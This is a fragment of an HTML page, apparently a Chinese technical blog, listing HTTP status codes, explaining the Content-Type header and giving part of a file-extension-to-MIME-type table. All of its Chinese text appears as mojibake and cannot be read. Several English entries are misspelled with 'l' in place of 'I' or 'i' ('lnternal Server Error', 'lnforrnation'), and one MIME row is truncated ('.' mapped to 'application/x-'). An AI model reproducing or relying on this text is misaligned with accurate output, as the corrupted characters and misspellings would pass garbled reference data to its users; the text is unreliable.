</td></tr><tr><td style="text-align:left">307</td><td style="text-align:left">Temporary Redirect</td><td style="text-align:left">ä¸´æ—¶é‡å®šå‘ã€‚ä¸302ç±»ä¼¼ã€‚ä½¿ç”¨GETè¯·æ±‚é‡å®šå‘</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">400</td><td style="text-align:left">Bad Request</td><td style="text-align:left">å®¢æˆ·ç«¯è¯·æ±‚çš„è¯­æ³•é”™è¯¯ï¼ŒæœåŠ¡å™¨æ— æ³•ç†è§£</td></tr><tr><td style="text-align:left">401</td><td style="text-align:left">Unauthorized</td><td style="text-align:left">è¯·æ±‚è¦æ±‚ç”¨æˆ·çš„èº«ä»½è®¤è¯</td></tr><tr><td style="text-align:left">402</td><td style="text-align:left">Payment Required</td><td style="text-align:left">ä¿ç•™ï¼Œå°†æ¥ä½¿ç”¨</td></tr><tr><td style="text-align:left">403</td><td style="text-align:left">Forbidden</td><td style="text-align:left">æœåŠ¡å™¨ç†è§£è¯·æ±‚å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æ‰§è¡Œæ­¤è¯·æ±‚</td></tr><tr><td style="text-align:left">404</td><td style="text-align:left">Not Found</td><td style="text-align:left">æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚æ‰¾åˆ°èµ„æºï¼ˆç½‘é¡µï¼‰ã€‚é€šè¿‡æ­¤ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯è®¾ç½®â€æ‚¨æ‰€è¯·æ±‚çš„èµ„æºæ— æ³•æ‰¾åˆ°â€çš„ä¸ªæ€§é¡µé¢</td></tr><tr><td style="text-align:left">405</td><td style="text-align:left">Method Not Allowed</td><td style="text-align:left">å®¢æˆ·ç«¯è¯·æ±‚ä¸­çš„æ–¹æ³•è¢«ç¦æ­¢</td></tr><tr><td style="text-align:left">406</td><td style="text-align:left">Not Acceptable</td><td style="text-align:left">æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚çš„å†…å®¹ç‰¹æ€§å®Œæˆè¯·æ±‚</td></tr><tr><td style="text-align:left">407</td><td style="text-align:left">Proxy Authentication Required</td><td style="text-align:left">è¯·æ±‚è¦æ±‚ä»£ç†çš„èº«ä»½è®¤è¯ï¼Œä¸401ç±»ä¼¼ï¼Œä½†è¯·æ±‚è€…åº”å½“ä½¿ç”¨ä»£ç†è¿›è¡Œæˆæƒ</td></tr><tr><td style="text-align:left">408</td><td style="text-align:left">Request Time-out</td><td style="text-align:left">æœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚æ—¶é—´è¿‡é•¿ï¼Œè¶…æ—¶</td></tr><tr><td style="text-align:left">409</td><td style="text-align:left">Conflict</td><td style="text-align:left">æœåŠ¡å™¨å®Œæˆå®¢æˆ·ç«¯çš„ PUT è¯·æ±‚æ—¶å¯èƒ½è¿”å›æ­¤ä»£ç ï¼ŒæœåŠ¡å™¨å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿäº†å†²çª</td></tr><tr><td style="text-align:left">410</td><td style="text-align:left">Gone</td><td style="text-align:left">å®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºå·²ç»ä¸å­˜åœ¨ã€‚410ä¸åŒäº404ï¼Œå¦‚æœèµ„æºä»¥å‰æœ‰ç°åœ¨è¢«æ°¸ä¹…åˆ é™¤äº†å¯ä½¿ç”¨410ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯é€šè¿‡301ä»£ç æŒ‡å®šèµ„æºçš„æ–°ä½ç½®</td></tr><tr><td style="text-align:left">411</td><td style="text-align:left">Length Required</td><td style="text-align:left">æœåŠ¡å™¨æ— æ³•å¤„ç†å®¢æˆ·ç«¯å‘é€çš„ä¸å¸¦Content-Lengthçš„è¯·æ±‚ä¿¡æ¯</td></tr><tr><td style="text-align:left">412</td><td style="text-align:left">Precondition Failed</td><td style="text-align:left">å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯çš„å…ˆå†³æ¡ä»¶é”™è¯¯</td></tr><tr><td style="text-align:left">413</td><td style="text-align:left">Request Entity Too Large</td><td style="text-align:left">ç”±äºè¯·æ±‚çš„å®ä½“è¿‡å¤§ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ï¼Œå› æ­¤æ‹’ç»è¯·æ±‚ã€‚ä¸ºé˜²æ­¢å®¢æˆ·ç«¯çš„è¿ç»­è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šå…³é—­è¿æ¥ã€‚å¦‚æœåªæ˜¯æœåŠ¡å™¨æš‚æ—¶æ— æ³•å¤„ç†ï¼Œåˆ™ä¼šåŒ…å«ä¸€ä¸ªRetry-Afterçš„å“åº”ä¿¡æ¯</td></tr><tr><td style="text-align:left">414</td><td style="text-align:left">Request-URI Too Large</td><td style="text-align:left">è¯·æ±‚çš„URIè¿‡é•¿ï¼ˆURIé€šå¸¸ä¸ºç½‘å€ï¼‰ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†</td></tr><tr><td style="text-align:left">415</td><td style="text-align:left">Unsupported Media Type</td><td style="text-align:left">æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚é™„å¸¦çš„åª’ä½“æ ¼å¼</td></tr><tr><td style="text-align:left">416</td><td style="text-align:left">Requested range not satisfiable</td><td style="text-align:left">å®¢æˆ·ç«¯è¯·æ±‚çš„èŒƒå›´æ— æ•ˆ</td></tr><tr><td style="text-align:left">417</td><td style="text-align:left">Expectation Failed</td><td style="text-align:left">æœåŠ¡å™¨æ— æ³•æ»¡è¶³Expectçš„è¯·æ±‚å¤´ä¿¡æ¯</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">500</td><td style="text-align:left">Internal Server Error</td><td style="text-align:left">æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œæ— æ³•å®Œæˆè¯·æ±‚</td></tr><tr><td style="text-align:left">501</td><td style="text-align:left">Not Implemented</td><td style="text-align:left">æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„åŠŸèƒ½ï¼Œæ— æ³•å®Œæˆè¯·æ±‚</td></tr><tr><td style="text-align:left">502</td><td style="text-align:left">Bad Gateway</td><td style="text-align:left">ä½œä¸ºç½‘å…³æˆ–è€…ä»£ç†å·¥ä½œçš„æœåŠ¡å™¨å°è¯•æ‰§è¡Œè¯·æ±‚æ—¶ï¼Œä»è¿œç¨‹æœåŠ¡å™¨æ¥æ”¶åˆ°äº†ä¸€ä¸ªæ— æ•ˆçš„å“åº”</td></tr><tr><td style="text-align:left">503</td><td style="text-align:left">Service Unavailable</td><td style="text-align:left">ç”±äºè¶…è½½æˆ–ç³»ç»Ÿç»´æŠ¤ï¼ŒæœåŠ¡å™¨æš‚æ—¶çš„æ— æ³•å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å»¶æ—¶çš„é•¿åº¦å¯åŒ…å«åœ¨æœåŠ¡å™¨çš„Retry-Afterå¤´ä¿¡æ¯ä¸­</td></tr><tr><td style="text-align:left">504</td><td style="text-align:left">Gateway Time-out</td><td style="text-align:left">å……å½“ç½‘å…³æˆ–ä»£ç†çš„æœåŠ¡å™¨ï¼ŒæœªåŠæ—¶ä»è¿œç«¯æœåŠ¡å™¨è·å–è¯·æ±‚</td></tr><tr><td style="text-align:left">505</td><td style="text-align:left">HTTP Version not supported</td><td style="text-align:left">æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„HTTPåè®®çš„ç‰ˆæœ¬ï¼Œæ— æ³•å®Œæˆå¤„ç†</td></tr></tbody></table></div><h3 id="3ï¼‰HTTPçŠ¶æ€ç "><a href="#3ï¼‰HTTPçŠ¶æ€ç " class="headerlink" title="3ï¼‰HTTPçŠ¶æ€ç "></a>3ï¼‰HTTPçŠ¶æ€ç </h3><div class="table-container"><table><thead><tr><th>æ¶ˆæ¯</th><th></th><th>è¯·æ±‚é”™è¯¯</th><th></th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>400</td><td>Bad Request</td></tr><tr><td>101</td><td>Switching Protocols</td><td>401</td><td>unauthorized</td></tr><tr><td>102</td><td>Processing</td><td>402</td><td>Payment Required</td></tr><tr><td><strong>æˆåŠŸ</strong></td><td></td><td>403</td><td>Forbidden</td></tr><tr><td>200</td><td>OK</td><td>404</td><td>Not Found</td></tr><tr><td>201</td><td>Created</td><td>405</td><td>Method Not Allowed</td></tr><tr><td>202</td><td>Accepted</td><td>406</td><td>Not Acceptable</td></tr><tr><td>203</td><td>Non-Authoritative lnforrnation</td><td>407</td><td>Proxy Authentication Required</td></tr><tr><td>204</td><td>No Content</td><td>408</td><td>Request Timeout</td></tr><tr><td>205</td><td>Reset Content</td><td>409</td><td>Conflict</td></tr><tr><td>206</td><td>Partial Content</td><td>410</td><td>Gone</td></tr><tr><td>207</td><td>Multi-Status</td><td>411</td><td>Length Required</td></tr><tr><td><strong>é‡å®šå‘</strong></td><td></td><td>412</td><td>Precondition Failed</td></tr><tr><td>300</td><td>Multiple Choices</td><td>413</td><td>Request Entity Too Large</td></tr><tr><td>301</td><td>Moved Permanently</td><td>414</td><td>Request-URI Too Long</td></tr><tr><td>302</td><td>Move Temporarily</td><td>415</td><td>Unsupported Media Type</td></tr><tr><td>303</td><td>See Other</td><td>416</td><td>Requested Range Not Satisfiable</td></tr><tr><td>304</td><td>Not Modified</td><td>417</td><td>Expectation Failed</td></tr><tr><td>305</td><td>Use Proxy</td><td>418</td><td>I â€˜ m a teapot</td></tr><tr><td>306</td><td>Switch Proxy</td><td>421</td><td>Too Many Connections</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>422</td><td>Unprocessable Entity</td></tr><tr><td><strong>æœåŠ¡å™¨é”™è¯¯</strong></td><td></td><td>423</td><td>Locked</td></tr><tr><td>500</td><td>lnternal Server Error</td><td>424</td><td>Failed Dependency</td></tr><tr><td>501</td><td>Not lmplemented</td><td>425</td><td>Too Early</td></tr><tr><td>502</td><td>Bad Gateway</td><td>426</td><td>Upgrade Required</td></tr><tr><td>503</td><td>Service unavailable</td><td>449</td><td>Retry With</td></tr><tr><td>504</td><td>Gateway Timeout</td><td>451</td><td>Unavailable For Legal Reasons</td></tr><tr><td>505</td><td>HTTP Version Not Supported</td><td></td><td></td></tr><tr><td>506</td><td>Variant Also Negotiates</td><td></td><td></td></tr><tr><td>507</td><td>lnsuffcient Storage</td><td></td><td></td></tr><tr><td>509</td><td>Bandwidth Limit Exceeded</td><td></td><td></td></tr><tr><td>510</td><td>Not Extended</td><td></td><td></td></tr><tr><td>600</td><td>Unparseable Response Headers</td><td></td></tr></tbody></table></div><h2 id="6ã€HTTP-content-type"><a href="#6ã€HTTP-content-type" class="headerlink" title="6ã€HTTP content-type"></a>6ã€HTTP content-type</h2><p>Content-Typeï¼ˆå†…å®¹ç±»å‹ï¼‰ï¼Œä¸€èˆ¬æ˜¯æŒ‡ç½‘é¡µä¸­å­˜åœ¨çš„ Content-Typeï¼Œç”¨äºå®šä¹‰ç½‘ç»œæ–‡ä»¶çš„ç±»å‹å’Œç½‘é¡µçš„ç¼–ç ï¼Œå†³å®šæµè§ˆå™¨å°†ä»¥ä»€ä¹ˆå½¢å¼ã€ä»€ä¹ˆç¼–ç è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™å°±æ˜¯ç»å¸¸çœ‹åˆ°ä¸€äº› PHP ç½‘é¡µç‚¹å‡»çš„ç»“æœå´æ˜¯ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶æˆ–ä¸€å¼ å›¾ç‰‡çš„åŸå› ã€‚</p><p>Content-Type æ ‡å¤´å‘Šè¯‰å®¢æˆ·ç«¯å®é™…è¿”å›çš„å†…å®¹çš„å†…å®¹ç±»å‹ã€‚</p><p>è¯­æ³•æ ¼å¼ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=something<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br></code></pre></td></tr></table></figure><h3 id="1ï¼‰åª’ä½“æ ¼å¼ç±»å‹"><a href="#1ï¼‰åª’ä½“æ ¼å¼ç±»å‹" class="headerlink" title="1ï¼‰åª’ä½“æ ¼å¼ç±»å‹"></a>1ï¼‰åª’ä½“æ ¼å¼ç±»å‹</h3><p>å¸¸è§çš„åª’ä½“æ ¼å¼ç±»å‹å¦‚ä¸‹ï¼š</p><ul><li>text/html ï¼š HTMLæ ¼å¼</li><li>text/plain ï¼šçº¯æ–‡æœ¬æ ¼å¼</li><li>text/xml ï¼š XMLæ ¼å¼</li><li>image/gif ï¼šgifå›¾ç‰‡æ ¼å¼</li><li>image/jpeg ï¼šjpgå›¾ç‰‡æ ¼å¼</li><li>image/pngï¼špngå›¾ç‰‡æ ¼å¼</li></ul><p>ä»¥applicationå¼€å¤´çš„åª’ä½“æ ¼å¼ç±»å‹ï¼š</p><ul><li>application/xhtml+xml ï¼šXHTMLæ ¼å¼</li><li>application/xmlï¼š XMLæ•°æ®æ ¼å¼</li><li>application/atom+xml ï¼šAtom XMLèšåˆæ ¼å¼</li><li>application/jsonï¼š JSONæ•°æ®æ ¼å¼</li><li>application/pdfï¼špdfæ ¼å¼</li><li>application/msword ï¼š Wordæ–‡æ¡£æ ¼å¼</li><li>application/octet-stream ï¼š äºŒè¿›åˆ¶æµæ•°æ®ï¼ˆå¦‚å¸¸è§çš„æ–‡ä»¶ä¸‹è½½ï¼‰</li><li>application/x-www-form-urlencoded ï¼š <form enctype="â€â€">ä¸­é»˜è®¤çš„encTypeï¼Œformè¡¨å•æ•°æ®è¢«ç¼–ç ä¸ºkey/valueæ ¼å¼å‘é€åˆ°æœåŠ¡å™¨ï¼ˆè¡¨å•é»˜è®¤çš„æäº¤æ•°æ®çš„æ ¼å¼ï¼‰</form></li></ul><p>å¦å¤–ä¸€ç§å¸¸è§çš„åª’ä½“æ ¼å¼æ˜¯ä¸Šä¼ æ–‡ä»¶ä¹‹æ—¶ä½¿ç”¨çš„ï¼š</p><ul><li>multipart/form-data ï¼š éœ€è¦åœ¨è¡¨å•ä¸­è¿›è¡Œæ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨è¯¥æ ¼å¼</li></ul><h3 id="2ï¼‰HTTP-content-type-å¯¹ç…§è¡¨"><a href="#2ï¼‰HTTP-content-type-å¯¹ç…§è¡¨" class="headerlink" title="2ï¼‰HTTP content-type å¯¹ç…§è¡¨"></a>2ï¼‰HTTP content-type å¯¹ç…§è¡¨</h3><div class="table-container"><table><thead><tr><th style="text-align:left">æ–‡ä»¶æ‰©å±•å</th><th style="text-align:left">Content-Type(Mime-Type)</th><th style="text-align:left">æ–‡ä»¶æ‰©å±•å</th><th style="text-align:left">Content-Type(Mime-Type)</th></tr></thead><tbody><tr><td style="text-align:left">.*ï¼ˆ äºŒè¿›åˆ¶æµï¼Œä¸çŸ¥é“ä¸‹è½½æ–‡ä»¶ç±»å‹ï¼‰</td><td style="text-align:left">application/octet-stream</td><td style="text-align:left">.tif</td><td style="text-align:left">image/tiff</td></tr><tr><td style="text-align:left">.001</td><td style="text-align:left">application/x-001</td><td style="text-align:left">.301</td><td style="text-align:left">application/x-301</td></tr><tr><td style="text-align:left">.323</td><td style="text-align:left">text/h323</td><td style="text-align:left">.906</td><td style="text-align:left">application/x-906</td></tr><tr><td style="text-align:left">.907</td><td style="text-align:left">drawing/907</td><td style="text-align:left">.a11</td><td style="text-align:left">application/x-a11</td></tr><tr><td style="text-align:left">.acp</td><td style="text-align:left">audio/x-mei-aac</td><td style="text-align:left">.ai</td><td style="text-align:left">application/postscript</td></tr><tr><td style="text-align:left">.aif</td><td style="text-align:left">audio/aiff</td><td style="text-align:left">.aifc</td><td style="text-align:left">audio/aiff</td></tr><tr><td style="text-align:left">.aiff</td><td style="text-align:left">audio/aiff</td><td style="text-align:left">.anv</td><td style="text-align:left">application/x-anv</td></tr><tr><td style="text-align:left">.asa</td><td style="text-align:left">text/asa</td><td style="text-align:left">.asf</td><td style="text-align:left">video/x-ms-asf</td></tr><tr><td style="text-align:left">.asp</td><td style="text-align:left">text/asp</td><td style="text-align:left">.asx</td><td style="text-align:left">video/x-ms-asf</td></tr><tr><td style="text-align:left">.au</td><td style="text-align:left">audio/basic</td><td style="text-align:left">.avi</td><td style="text-align:left">video/avi</td></tr><tr><td style="text-align:left">.awf</td><td style="text-align:left">application/vnd.adobe.workflow</td><td style="text-align:left">.biz</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.bmp</td><td style="text-align:left">application/x-bmp</td><td style="text-align:left">.bot</td><td style="text-align:left">application/x-bot</td></tr><tr><td style="text-align:left">.c4t</td><td style="text-align:left">application/x-c4t</td><td style="text-align:left">.c90</td><td style="text-align:left">application/x-c90</td></tr><tr><td style="text-align:left">.cal</td><td style="text-align:left">application/x-cals</td><td style="text-align:left">.cat</td><td style="text-align:left">application/vnd.ms-pki.seccat</td></tr><tr><td style="text-align:left">.cdf</td><td style="text-align:left">application/x-netcdf</td><td style="text-align:left">.cdr</td><td style="text-align:left">application/x-cdr</td></tr><tr><td style="text-align:left">.cel</td><td style="text-align:left">application/x-cel</td><td style="text-align:left">.cer</td><td style="text-align:left">application/x-x509-ca-cert</td></tr><tr><td style="text-align:left">.cg4</td><td style="text-align:left">application/x-g4</td><td style="text-align:left">.cgm</td><td style="text-align:left">application/x-cgm</td></tr><tr><td style="text-align:left">.cit</td><td style="text-align:left">application/x-cit</td><td style="text-align:left">.class</td><td style="text-align:left">java/*</td></tr><tr><td style="text-align:left">.cml</td><td style="text-align:left">text/xml</td><td style="text-align:left">.cmp</td><td style="text-align:left">application/x-cmp</td></tr><tr><td style="text-align:left">.cmx</td><td style="text-align:left">application/x-cmx</td><td style="text-align:left">.cot</td><td style="text-align:left">application/x-cot</td></tr><tr><td style="text-align:left">.crl</td><td style="text-align:left">application/pkix-crl</td><td style="text-align:left">.crt</td><td style="text-align:left">application/x-x509-ca-cert</td></tr><tr><td style="text-align:left">.csi</td><td style="text-align:left">application/x-csi</td><td style="text-align:left">.css</td><td style="text-align:left">text/css</td></tr><tr><td style="text-align:left">.cut</td><td style="text-align:left">application/x-cut</td><td style="text-align:left">.dbf</td><td style="text-align:left">application/x-dbf</td></tr><tr><td style="text-align:left">.dbm</td><td style="text-align:left">application/x-dbm</td><td style="text-align:left">.dbx</td><td style="text-align:left">application/x-dbx</td></tr><tr><td style="text-align:left">.dcd</td><td style="text-align:left">text/xml</td><td style="text-align:left">.dcx</td><td style="text-align:left">application/x-dcx</td></tr><tr><td style="text-align:left">.der</td><td style="text-align:left">application/x-x509-ca-cert</td><td style="text-align:left">.dgn</td><td style="text-align:left">application/x-dgn</td></tr><tr><td style="text-align:left">.dib</td><td style="text-align:left">application/x-dib</td><td style="text-align:left">.dll</td><td style="text-align:left">application/x-msdownload</td></tr><tr><td style="text-align:left">.doc</td><td style="text-align:left">application/msword</td><td style="text-align:left">.dot</td><td style="text-align:left">application/msword</td></tr><tr><td style="text-align:left">.drw</td><td style="text-align:left">application/x-drw</td><td style="text-align:left">.dtd</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.dwf</td><td style="text-align:left">Model/vnd.dwf</td><td style="text-align:left">.dwf</td><td style="text-align:left">application/x-dwf</td></tr><tr><td style="text-align:left">.dwg</td><td style="text-align:left">application/x-dwg</td><td style="text-align:left">.dxb</td><td style="text-align:left">application/x-dxb</td></tr><tr><td style="text-align:left">.dxf</td><td style="text-align:left">application/x-dxf</td><td style="text-align:left">.edn</td><td style="text-align:left">application/vnd.adobe.edn</td></tr><tr><td style="text-align:left">.emf</td><td style="text-align:left">application/x-emf</td><td style="text-align:left">.eml</td><td style="text-align:left">message/rfc822</td></tr><tr><td style="text-align:left">.ent</td><td style="text-align:left">text/xml</td><td style="text-align:left">.epi</td><td style="text-align:left">application/x-epi</td></tr><tr><td style="text-align:left">.eps</td><td style="text-align:left">application/x-ps</td><td style="text-align:left">.eps</td><td style="text-align:left">application/postscript</td></tr><tr><td style="text-align:left">.etd</td><td style="text-align:left">application/x-ebx</td><td style="text-align:left">.exe</td><td style="text-align:left">application/x-msdownload</td></tr><tr><td style="text-align:left">.fax</td><td style="text-align:left">image/fax</td><td style="text-align:left">.fdf</td><td style="text-align:left">application/vnd.fdf</td></tr><tr><td style="text-align:left">.fif</td><td style="text-align:left">application/fractals</td><td style="text-align:left">.fo</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.frm</td><td style="text-align:left">application/x-frm</td><td style="text-align:left">.g4</td><td style="text-align:left">application/x-g4</td></tr><tr><td style="text-align:left">.gbr</td><td style="text-align:left">application/x-gbr</td><td style="text-align:left">.</td><td style="text-align:left">application/x-</td></tr><tr><td style="text-align:left">.gif</td><td style="text-align:left">image/gif</td><td style="text-align:left">.gl2</td><td style="text-align:left">application/x-gl2</td></tr><tr><td style="text-align:left">.gp4</td><td style="text-align:left">application/x-gp4</td><td style="text-align:left">.hgl</td><td style="text-align:left">application/x-hgl</td></tr><tr><td style="text-align:left">.hmr</td><td style="text-align:left">application/x-hmr</td><td style="text-align:left">.hpg</td><td style="text-align:left">application/x-hpgl</td></tr><tr><td style="text-align:left">.hpl</td><td style="text-align:left">application/x-hpl</td><td style="text-align:left">.hqx</td><td style="text-align:left">application/mac-binhex40</td></tr><tr><td style="text-align:left">.hrf</td><td style="text-align:left">application/x-hrf</td><td style="text-align:left">.hta</td><td style="text-align:left">application/hta</td></tr><tr><td style="text-align:left">.htc</td><td style="text-align:left">text/x-component</td><td style="text-align:left">.htm</td><td style="text-align:left">text/html</td></tr><tr><td style="text-align:left">.html</td><td style="text-align:left">text/html</td><td style="text-align:left">.htt</td><td style="text-align:left">text/webviewhtml</td></tr><tr><td style="text-align:left">.htx</td><td style="text-align:left">text/html</td><td style="text-align:left">.icb</td><td style="text-align:left">application/x-icb</td></tr><tr><td style="text-align:left">.ico</td><td style="text-align:left">image/x-icon</td><td style="text-align:left">.ico</td><td style="text-align:left">application/x-ico</td></tr><tr><td style="text-align:left">.iff</td><td style="text-align:left">application/x-iff</td><td style="text-align:left">.ig4</td><td style="text-align:left">application/x-g4</td></tr><tr><td style="text-align:left">.igs</td><td style="text-align:left">application/x-igs</td><td style="text-align:left">.iii</td><td style="text-align:left">application/x-iphone</td></tr><tr><td style="text-align:left">.img</td><td style="text-align:left">application/x-img</td><td style="text-align:left">.ins</td><td style="text-align:left">application/x-internet-signup</td></tr><tr><td style="text-align:left">.isp</td><td style="text-align:left">application/x-internet-signup</td><td style="text-align:left">.IVF</td><td style="text-align:left">video/x-ivf</td></tr><tr><td style="text-align:left">.java</td><td style="text-align:left">java/*</td><td style="text-align:left">.jfif</td><td style="text-align:left">image/jpeg</td></tr><tr><td style="text-align:left">.jpe</td><td style="text-align:left">image/jpeg</td><td style="text-align:left">.jpe</td><td style="text-align:left">application/x-jpe</td></tr><tr><td style="text-align:left">.jpeg</td><td style="text-align:left">image/jpeg</td><td style="text-align:left">.jpg</td><td style="text-align:left">image/jpeg</td></tr><tr><td style="text-align:left">.jpg</td><td style="text-align:left">application/x-jpg</td><td style="text-align:left">.js</td><td style="text-align:left">application/x-javascript</td></tr><tr><td style="text-align:left">.jsp</td><td style="text-align:left">text/html</td><td style="text-align:left">.la1</td><td style="text-align:left">audio/x-liquid-file</td></tr><tr><td style="text-align:left">.lar</td><td style="text-align:left">application/x-laplayer-reg</td><td style="text-align:left">.latex</td><td style="text-align:left">application/x-latex</td></tr><tr><td style="text-align:left">.lavs</td><td style="text-align:left">audio/x-liquid-secure</td><td style="text-align:left">.lbm</td><td style="text-align:left">application/x-lbm</td></tr><tr><td style="text-align:left">.lmsff</td><td style="text-align:left">audio/x-la-lms</td><td style="text-align:left">.ls</td><td style="text-align:left">application/x-javascript</td></tr><tr><td style="text-align:left">.ltr</td><td style="text-align:left">application/x-ltr</td><td style="text-align:left">.m1v</td><td style="text-align:left">video/x-mpeg</td></tr><tr><td style="text-align:left">.m2v</td><td style="text-align:left">video/x-mpeg</td><td style="text-align:left">.m3u</td><td style="text-align:left">audio/mpegurl</td></tr><tr><td style="text-align:left">.m4e</td><td style="text-align:left">video/mpeg4</td><td style="text-align:left">.mac</td><td style="text-align:left">application/x-mac</td></tr><tr><td style="text-align:left">.man</td><td style="text-align:left">application/x-troff-man</td><td style="text-align:left">.math</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.mdb</td><td style="text-align:left">application/msaccess</td><td style="text-align:left">.mdb</td><td style="text-align:left">application/x-mdb</td></tr><tr><td style="text-align:left">.mfp</td><td style="text-align:left">application/x-shockwave-flash</td><td style="text-align:left">.mht</td><td style="text-align:left">message/rfc822</td></tr><tr><td style="text-align:left">.mhtml</td><td style="text-align:left">message/rfc822</td><td style="text-align:left">.mi</td><td style="text-align:left">application/x-mi</td></tr><tr><td style="text-align:left">.mid</td><td style="text-align:left">audio/mid</td><td style="text-align:left">.midi</td><td style="text-align:left">audio/mid</td></tr><tr><td style="text-align:left">.mil</td><td style="text-align:left">application/x-mil</td><td style="text-align:left">.mml</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.mnd</td><td style="text-align:left">audio/x-musicnet-download</td><td style="text-align:left">.mns</td><td style="text-align:left">audio/x-musicnet-stream</td></tr><tr><td style="text-align:left">.mocha</td><td style="text-align:left">application/x-javascript</td><td style="text-align:left">.movie</td><td style="text-align:left">video/x-sgi-movie</td></tr><tr><td style="text-align:left">.mp1</td><td style="text-align:left">audio/mp1</td><td style="text-align:left">.mp2</td><td style="text-align:left">audio/mp2</td></tr><tr><td style="text-align:left">.mp2v</td><td style="text-align:left">video/mpeg</td><td style="text-align:left">.mp3</td><td style="text-align:left">audio/mp3</td></tr><tr><td style="text-align:left">.mp4</td><td style="text-align:left">video/mpeg4</td><td style="text-align:left">.mpa</td><td style="text-align:left">video/x-mpg</td></tr><tr><td style="text-align:left">.mpd</td><td style="text-align:left">application/vnd.ms-project</td><td style="text-align:left">.mpe</td><td style="text-align:left">video/x-mpeg</td></tr><tr><td style="text-align:left">.mpeg</td><td style="text-align:left">video/mpg</td><td style="text-align:left">.mpg</td><td style="text-align:left">video/mpg</td></tr><tr><td style="text-align:left">.mpga</td><td style="text-align:left">audio/rn-mpeg</td><td style="text-align:left">.mpp</td><td style="text-align:left">application/vnd.ms-project</td></tr><tr><td style="text-align:left">.mps</td><td style="text-align:left">video/x-mpeg</td><td style="text-align:left">.mpt</td><td style="text-align:left">application/vnd.ms-project</td></tr><tr><td style="text-align:left">.mpv</td><td style="text-align:left">video/mpg</td><td style="text-align:left">.mpv2</td><td style="text-align:left">video/mpeg</td></tr><tr><td style="text-align:left">.mpw</td><td style="text-align:left">application/vnd.ms-project</td><td style="text-align:left">.mpx</td><td style="text-align:left">application/vnd.ms-project</td></tr><tr><td style="text-align:left">.mtx</td><td style="text-align:left">text/xml</td><td style="text-align:left">.mxp</td><td style="text-align:left">application/x-mmxp</td></tr><tr><td style="text-align:left">.net</td><td style="text-align:left">image/pnetvue</td><td style="text-align:left">.nrf</td><td style="text-align:left">application/x-nrf</td></tr><tr><td style="text-align:left">.nws</td><td style="text-align:left">message/rfc822</td><td style="text-align:left">.odc</td><td style="text-align:left">text/x-ms-odc</td></tr><tr><td style="text-align:left">.out</td><td style="text-align:left">application/x-out</td><td style="text-align:left">.p10</td><td style="text-align:left">application/pkcs10</td></tr><tr><td style="text-align:left">.p12</td><td style="text-align:left">application/x-pkcs12</td><td style="text-align:left">.p7b</td><td style="text-align:left">application/x-pkcs7-certificates</td></tr><tr><td style="text-align:left">.p7c</td><td style="text-align:left">application/pkcs7-mime</td><td style="text-align:left">.p7m</td><td style="text-align:left">application/pkcs7-mime</td></tr><tr><td style="text-align:left">.p7r</td><td style="text-align:left">application/x-pkcs7-certreqresp</td><td style="text-align:left">.p7s</td><td style="text-align:left">application/pkcs7-signature</td></tr><tr><td style="text-align:left">.pc5</td><td style="text-align:left">application/x-pc5</td><td style="text-align:left">.pci</td><td style="text-align:left">application/x-pci</td></tr><tr><td style="text-align:left">.pcl</td><td style="text-align:left">application/x-pcl</td><td style="text-align:left">.pcx</td><td style="text-align:left">application/x-pcx</td></tr><tr><td style="text-align:left">.pdf</td><td style="text-align:left">application/pdf</td><td style="text-align:left">.pdf</td><td style="text-align:left">application/pdf</td></tr><tr><td style="text-align:left">.pdx</td><td style="text-align:left">application/vnd.adobe.pdx</td><td style="text-align:left">.pfx</td><td style="text-align:left">application/x-pkcs12</td></tr><tr><td style="text-align:left">.pgl</td><td style="text-align:left">application/x-pgl</td><td style="text-align:left">.pic</td><td style="text-align:left">application/x-pic</td></tr><tr><td style="text-align:left">.pko</td><td style="text-align:left">application/vnd.ms-pki.pko</td><td style="text-align:left">.pl</td><td style="text-align:left">application/x-perl</td></tr><tr><td style="text-align:left">.plg</td><td style="text-align:left">text/html</td><td style="text-align:left">.pls</td><td style="text-align:left">audio/scpls</td></tr><tr><td style="text-align:left">.plt</td><td style="text-align:left">application/x-plt</td><td style="text-align:left">.png</td><td style="text-align:left">image/png</td></tr><tr><td style="text-align:left">.png</td><td style="text-align:left">application/x-png</td><td style="text-align:left">.pot</td><td 